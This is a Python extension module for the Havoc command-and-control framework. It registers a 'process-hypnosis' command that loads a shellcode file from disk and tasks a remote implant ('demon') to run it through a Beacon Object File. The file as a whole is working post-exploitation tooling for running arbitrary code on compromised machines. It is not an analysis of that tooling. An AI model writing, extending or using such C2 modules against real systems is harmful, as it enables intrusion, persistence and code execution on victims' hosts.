from havoc import Demon, RegisterCommand, RegisterModule
from os.path import exists
from struct import pack, calcsize

class Packer:
    def __init__(self):
        self.buffer: bytes = b''
        self.size: int = 0

    def getbuffer(self):
        return pack("<L", self.size) + self.buffer

    def addbytes(self, b):
        if b is None:
            b = b''
        fmt = "<L{}s".format(len(b))
        self.buffer += pack(fmt, len(b), b)
        self.size += calcsize(fmt)

    def addstr(self, s):
        if s is None:
            s = ''
        if isinstance(s, str):
            s = s.encode("utf-8")
        fmt = "<L{}s".format(len(s) + 1)
        self.buffer += pack(fmt, len(s) + 1, s)
        self.size += calcsize(fmt)

    def addint(self, dint):
        self.buffer += pack("<i", dint)
        self.size += 4

def module_stomp(demon_id, *args):
    
    task_id: str = None
    demon: Demon = None
    packer: Packer = Packer()
    binary: bytes = None

    # Get the agent instance based on demon ID
    demon = Demon(demon_id)

    # Check if enough arguments have been specified
    if len(args) < 1:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Not enough arguments")
        return False

    # Get shellcode path
    path = args[0]

    # Check if the shellcode path exists
    if not exists(path):
        demon.ConsoleWrite(demon.CONSOLE_ERROR, f"Shellcode not found: {path}")
        return False

    # Read the shellcode from the specified path into 'binary' variable
    with open(path, 'rb') as handle:
        binary = handle.read()

    if not binary:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Specified shellcode is empty")
        return False

    # Add the arguments to the packer
    packer.addbytes(binary)

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, f"Tasked the demon to execute process-hypnosis BoF [binary length: {len(binary)} bytes]")

    # Task the agent to execute the BoF with the entry point being "go" 
    # and the arguments being the packed arguments buffer
    demon.InlineExecute(task_id, "go", f"/usr/share/havoc/client/Modules/process-hypnosis/processhypn/bof.o", packer.getbuffer(), False)

    return task_id

RegisterCommand(module_stomp, "", "process-hypnosis", "Process Hypnosis BoF to execute shellcode", 0, "[shellcode path]", "/tmp/demon.x64.bin")
